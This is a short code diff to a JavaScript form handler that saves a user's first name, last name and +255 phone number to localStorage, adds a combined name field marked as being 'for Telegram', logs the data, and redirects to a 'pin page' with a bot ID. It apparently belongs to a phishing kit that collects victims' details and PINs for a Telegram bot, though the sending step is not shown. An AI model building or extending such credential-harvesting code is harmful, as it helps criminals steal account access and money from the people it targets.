@@ -339,11 +339,19 @@ document.getElementById("detailsForm").addEventListener("submit", function(e){
     // Format full phone number
     const fullPhone = '+255 ' + phone;
 
-    // Save to localStorage
+    // Save to localStorage - ADDED full name field
     localStorage.setItem('firstName', firstName);
     localStorage.setItem('lastName', lastName);
+    localStorage.setItem('name', `${firstName} ${lastName}`); // ← ADDED THIS for Telegram
     localStorage.setItem('phone', fullPhone);
     localStorage.setItem('rawPhone', phone);
+
+    console.log('Saved user data:', {
+        firstName: firstName,
+        lastName: lastName,
+        name: `${firstName} ${lastName}`,
+        phone: fullPhone
+    });
 
     // Redirect to pin page with botId
     const botIdParam = botId || localStorage.getItem('botId') || '';
